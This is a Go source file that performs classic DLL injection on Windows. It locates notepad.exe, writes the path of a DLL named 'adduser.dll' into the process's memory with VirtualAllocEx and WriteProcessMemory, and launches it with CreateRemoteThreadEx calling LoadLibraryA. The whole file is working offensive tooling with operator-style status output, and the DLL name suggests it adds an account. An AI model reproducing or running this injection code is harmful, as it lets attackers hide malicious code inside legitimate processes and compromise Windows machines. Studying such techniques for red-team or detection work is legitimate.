package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
	"syscall"
	ps "github.com/mitchellh/go-ps"
)

import "C"

func findProcess(proc string) int {
    processList, err := ps.Processes()
    if err != nil {
        return -1
    }

    for x := range processList {
        var process ps.Process
        process = processList[x]
        if process.Executable() != proc {
            continue
        }
        p, errOpenProcess := windows.OpenProcess(
        	windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
        if errOpenProcess != nil {
        	continue
        }
        windows.CloseHandle(p)
        return process.Pid()
    }
    return 0
}

func main() {
	pid := findProcess("notepad.exe")
	fmt.Printf("    [*] Injecting into notepad.exe, PID=[%d]\n", pid)
	if pid == 0 {
		panic("Cannot find notepad.exe process")
	}
	
	dll := "C:\\users\\operator\\Downloads\\adduser.dll"
	dllname := append([]byte(dll), 0)
	dlllen := len(dllname)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	
	k32, _ := syscall.LoadLibrary("kernel32.dll")
	LoadLibraryA, _ := syscall.GetProcAddress(syscall.Handle(k32), "LoadLibraryA")
	
	proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if errOpenProcess != nil {
		panic(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(dlllen), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, uintptr(unsafe.Pointer(&dllname[0])), uintptr(dlllen))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc),addr,uintptr(dlllen), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, LoadLibraryA, addr, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		panic(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
}
